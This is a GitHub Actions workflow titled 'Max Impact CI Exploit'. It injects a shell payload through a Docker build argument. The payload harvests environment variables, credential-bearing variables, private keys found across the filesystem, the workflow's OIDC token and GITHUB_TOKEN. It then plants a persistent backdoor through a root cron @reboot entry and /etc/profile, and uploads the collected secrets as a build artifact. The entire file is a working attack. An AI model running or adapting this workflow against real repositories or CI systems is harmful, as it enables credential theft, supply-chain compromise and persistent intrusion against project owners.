name: Max Impact CI Exploit
on: [push]

jobs:
  exploit:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read

    steps:
      - name: Checkout Repository
        uses: actions/checkout@v4

      - name: Prepare Dockerfile
        run: |
          mkdir -p ./taskcluster/docker/python
          cp Dockerfile ./taskcluster/docker/python/

      - name: Run Exploit
        run: |
          PAYLOAD=$(cat <<'EOF'
          echo "[INFO] Starting CI exploit..." > /leaks.txt
          
          echo "--- ENVIRONMENT VARIABLES ---" >> /leaks.txt
          printenv >> /leaks.txt

          echo "--- USER INFO ---" >> /leaks.txt
          id >> /leaks.txt

          echo "--- SYSTEM INFO ---" >> /leaks.txt
          uname -a >> /leaks.txt
          cat /etc/os-release >> /leaks.txt

          echo "--- FILE SYSTEM ROOT ---" >> /leaks.txt
          ls -la / >> /leaks.txt

          echo "--- /etc CONTENT ---" >> /leaks.txt
          ls -la /etc >> /leaks.txt

          echo "--- PRIVATE KEYS ---" >> /leaks.txt
          find / -type f -exec grep -l "PRIVATE KEY" {} \; 2>/dev/null >> /leaks.txt

          echo "--- TOKENS / CREDS IN ENV ---" >> /leaks.txt
          env | grep -Ei 'token|secret|key|aws|google|azure' >> /leaks.txt

          echo "--- OIDC TOKEN ---" >> /leaks.txt
          curl -sLS "$ACTIONS_ID_TOKEN_REQUEST_URL" -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" >> /leaks.txt

          echo "--- GITHUB_TOKEN TEST ---" >> /leaks.txt
          echo "$GITHUB_TOKEN" >> /leaks.txt

          echo "--- INIT BACKDOOR ---" >> /leaks.txt
          echo '#!/bin/sh' > /usr/local/bin/init.sh
          echo 'echo "[BACKDOOR] Triggered" >> /runtime-leak.log' >> /usr/local/bin/init.sh
          echo 'printenv >> /runtime-leak.log' >> /usr/local/bin/init.sh
          chmod +x /usr/local/bin/init.sh
          echo "@reboot /usr/local/bin/init.sh" >> /etc/crontabs/root
          echo '/usr/local/bin/init.sh' >> /etc/profile
          EOF
          )

          docker build \
            --build-arg PYTHON_VERSION="$PAYLOAD" \
            -t full-exfil ./taskcluster/docker/python

          docker run --rm full-exfil cat /leaks.txt > ci-leaks.txt

      - name: Upload Leaks
        uses: actions/upload-artifact@v4
        with:
          name: full-ci-leaks
          path: ci-leaks.txt
